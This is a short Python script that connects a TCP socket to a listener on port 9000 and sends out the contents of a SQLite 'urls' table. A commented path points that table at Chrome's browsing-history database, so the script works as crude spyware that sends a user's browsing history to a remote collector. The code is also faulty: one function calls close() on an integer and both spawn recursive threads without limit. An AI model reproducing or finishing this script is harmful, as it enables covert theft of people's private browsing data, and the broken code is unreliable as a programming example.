import socket
import ipaddress
import os
import io
from io import BytesIO
import base64
import time
from time import sleep
# import datetime
from datetime import datetime
from tkinter import *
import subprocess
import sys
import sqlite3
import pickle
import json
import re
import threading
import struct
import random
# buffer = io.BytesIO()
# t = datetime.now() 
# # host = '192.168.1.74' # your ip address
# # host = '192.168.254.140' #you ip address
# port = 65535
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((socket.gethostname(),65535))
# s.connect((host,port))
port = 9000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((socket.gethostname(),65535))
s.connect((socket.gethostname(), port))

# def IsoClient():
def a():
    while True:
        try:
            # for n in range(2):
            cNumber = random.randrange(1,10)
            enCryp = cNumber
            # print(enCryp)
            s.sendall(bytes(str(enCryp), "utf-8"))
# cNumber.close()
            enCryp.close()
            l = threading.Thread(target=a)
            l.start()
        except:
            # thread.exit()
            break

def b():
    while True:
        try:
            conn = sqlite3.connect('yourdbfile')
            
            # conn = sqlite3.connect('SQLite_Python.db')
            # conn = sqlite3.connect('/Users/name/Library/Application Support/Google/Chrome/Default/yourdbfile')
            c = conn.cursor()
            # c.execute('''SELECT id, url, last_visit_time FROM urls''')
            c.execute('''SELECT url, time FROM urls''')


            rows = c.fetchall()

            conn.commit()
#close the connection
            conn.close()
            s.sendall(bytes(str(rows),'utf-8'))
            q = threading.Thread(target=b)
            q.start()
        except:
            break
           

if __name__ == "__main__":
    a()
    b()
